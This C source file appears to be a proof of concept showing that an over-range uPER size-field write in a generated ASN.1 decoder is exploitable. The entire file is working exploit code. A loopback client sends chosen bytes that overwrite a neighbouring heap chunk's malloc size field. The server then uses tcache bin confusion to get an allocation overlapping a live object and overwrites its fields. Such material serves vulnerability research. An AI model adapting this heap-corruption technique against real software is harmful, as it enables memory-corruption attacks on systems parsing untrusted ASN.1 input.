/* Consume the corrupted live malloc metadata from the pinned over-range uPER
 * size-field write.  Same generated SIZE(0..17) Payload and pinned runtime as
 * variant-service.c, but the heap is laid out A/B/C/D so the overflow from A
 * lands in B's size field.  A chosen size of 0x41 makes free(B) put B in the
 * 0x40 tcache bin; the following malloc(56) returns a chunk whose usable area
 * overlaps live Payload C.  A store through that legitimate malloc result
 * changes C's nCount/arr fields.  Loopback only (127.0.0.1).
 *
 * Usage: heap-chain <client|server> <port> <count> <hex-chosen-bytes>
 *   count=31, 31 hex bytes; bytes [20..27] are the little-endian size written
 *   into B's size field at A+24.  E.g. 41 followed by 30 zero bytes sets 0x41.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <malloc.h>
#include <netinet/in.h>
#include "asn1crt_encoding.h"
#include "schema.h"

static void put_bits(unsigned char *buf, int *bitpos, unsigned value, int nbits)
{
    int i;
    for (i = nbits - 1; i >= 0; i--) {
        if ((value >> i) & 1)
            buf[*bitpos / 8] |= (unsigned char)(0x80 >> (*bitpos % 8));
        (*bitpos)++;
    }
}

static int read_full(int fd, unsigned char *buf, int n)
{
    int got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, (size_t)(n - got));
        if (r <= 0) return -1;
        got += (int)r;
    }
    return 0;
}

static int hexval(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int parse_hex(const char *s, unsigned char *out, int n)
{
    int i;
    if (strlen(s) != (size_t)(2 * n)) return -1;
    for (i = 0; i < n; i++) {
        int hi = hexval(s[2 * i]), lo = hexval(s[2 * i + 1]);
        if (hi < 0 || lo < 0) return -1;
        out[i] = (unsigned char)((hi << 4) | lo);
    }
    return 0;
}

int main(int argc, char **argv)
{
    const char *role = argc > 1 ? argv[1] : "server";
    int port = argc > 2 ? atoi(argv[2]) : 39271;
    int count = argc > 3 ? atoi(argv[3]) : 31;
    unsigned char chosen[64], wire[128];
    int bitpos = 0, wlen, i;
    Payload *a, *b, *c, *d;
    unsigned char *ov;
    unsigned long bsize_before, bsize_after;
    setvbuf(stdout, NULL, _IONBF, 0);

    if (count > 64 || argc < 5 || parse_hex(argv[4], chosen, count) != 0)
        return 2;

    memset(wire, 0, sizeof(wire));
    put_bits(wire, &bitpos, (unsigned)count, 5);
    for (i = 0; i < count; i++)
        put_bits(wire, &bitpos, chosen[i], 8);
    wlen = (bitpos + 7) / 8;

    if (!strcmp(role, "client")) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        if (fd < 0) return 2;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (write(fd, wire, (size_t)wlen) != wlen) { close(fd); return 2; }
        printf("client sent %d bytes count=%d\n", wlen, count);
        close(fd);
        return 0;
    }

    {
        int lfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        int fd, yes = 1;
        if (lfd < 0) return 2;
        setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (listen(lfd, 1) != 0) return 2;
        fd = accept(lfd, (struct sockaddr *)&sa, &sl);
        if (fd < 0) return 2;
        close(lfd);
        if (read_full(fd, wire, wlen) != 0) { close(fd); return 2; }
        close(fd);
    }

    /* Consecutive 24-byte allocations: A/B/C/D chunks at A-16, A+16, A+48,
     * A+80.  B's size field is at A+24, inside A's overflow range. */
    a = (Payload *)malloc(sizeof(Payload));
    b = (Payload *)malloc(sizeof(Payload));
    c = (Payload *)malloc(sizeof(Payload));
    d = (Payload *)malloc(sizeof(Payload));
    if (!a || !b || !c || !d) return 2;
    bsize_before = *(unsigned long *)((unsigned char *)a + 24);
    c->nCount = 0x11223344;
    memset(c->arr, 0x11, sizeof(c->arr));

    {
        BitStream bs;
        int err = -1;
        flag ok;
        BitStream_AttachBuffer(&bs, wire, (long)wlen);
        ok = Payload_Decode(a, &bs, &err);
        bsize_after = *(unsigned long *)((unsigned char *)a + 24);
        printf("svc A=%p B=%p C=%p D=%p wlen=%d ok=%d err=%d decoded=%d\n",
               (void *)a, (void *)b, (void *)c, (void *)d,
               wlen, ok, err, a->nCount);
        printf("B size field at A+24: %#lx -> %#lx\n", bsize_before, bsize_after);
    }
    {
        unsigned char *ap = (unsigned char *)a;
        int j;
        printf("A bytes +16..+39: ");
        for (j = 16; j < 40; j++) printf("%02x", ap[j]);
        printf("\nchosen[16..27]: ");
        for (j = 16; j < 28; j++) printf("%02x", chosen[j]);
        printf("\n");
    }

    /* Consume the corrupted size: free(B) routes by the claimed 0x40 size,
     * then malloc(56) takes B back from that bin with 56 usable bytes. */
    free(b);
    ov = (unsigned char *)malloc(56);
    if (!ov) return 2;
    printf("ov=%p C=%p delta=%ld (usable C=%zu)\n",
           (void *)ov, (void *)c, (long)(ov - (unsigned char *)c),
           malloc_usable_size(c));

    printf("C before: nCount=%08x arr0=%02x\n", (unsigned)c->nCount, c->arr[0]);
    ov[32] = 0x77;   /* C->nCount byte 0 at A+64 */
    ov[36] = 0x42;   /* C->arr[0]       at A+68 */
    printf("C after:  nCount=%08x arr0=%02x\n", (unsigned)c->nCount, c->arr[0]);
    printf("ov[32..39]: %02x %02x %02x %02x %02x %02x %02x %02x\n",
           ov[32], ov[33], ov[34], ov[35], ov[36], ov[37], ov[38], ov[39]);
    return 0;
}
